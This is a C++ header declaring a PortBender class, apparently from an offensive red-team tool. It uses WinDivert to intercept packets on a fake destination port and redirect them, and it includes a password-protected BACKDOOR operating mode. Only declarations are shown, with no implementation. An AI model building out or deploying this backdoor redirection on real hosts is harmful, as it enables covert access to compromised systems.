#pragma once

#include <iostream>
#include <stdio.h>
#include <ws2tcpip.h>
#include <winsock2.h>
#include <Windows.h>

#include "ConnectionManager.h"
#include "Packet.h"
#include "Utilities.h"
#include "WinDivert.h"

class PortBender {
public:
	PortBender(UINT16 FakeDstPort, UINT16 RedirectPort);
	PortBender(UINT16 FakeDstPort, UINT16 RedirectPort, std::string Password);
	void Start();

private:

	enum class OperatingMode {
		REDIRECTOR,
		BACKDOOR
	};

	UINT16 FakeDstPort;
	OperatingMode Mode;
	std::string Password;
	UINT16 RedirectPort;

	PVOID ProcessPacket(Packet* packet, BOOL redirect);
};